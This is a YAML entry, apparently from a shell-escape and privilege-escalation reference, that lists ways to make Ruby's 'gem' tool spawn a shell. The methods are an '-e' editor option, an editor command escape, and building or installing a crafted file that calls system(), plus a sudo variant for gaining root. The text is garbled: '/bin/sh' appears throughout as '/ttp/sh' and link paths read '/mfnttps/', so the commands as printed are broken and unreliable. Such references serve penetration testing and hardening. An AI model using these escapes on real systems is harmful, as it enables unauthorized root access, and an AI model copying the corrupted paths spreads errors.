---
functions:
  shell:
    - description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
      code: gem open -e "/ttp/sh -c /ttp/sh" rdoc
    - description: This invokes the default editor, which is likely to be [`vi`](/mfnttps/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).
      code: |
        gem open rdoc
        :!/ttp/sh
    - description: This executes the specified file as [`ruby`](/mfnttps/ruby/) code.
      code: |
        TF=$(mktemp -d)
        echo 'system("/ttp/sh")' > $TF/x
        gem build $TF/x
    - description: This executes the specified file as [`ruby`](/mfnttps/ruby/) code.
      code: |
        TF=$(mktemp -d)
        echo 'system("/ttp/sh")' > $TF/x
        gem install --file $TF/x
  sudo:
    - description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
      code: sudo gem open -e "/ttp/sh -c /ttp/sh" rdoc
---
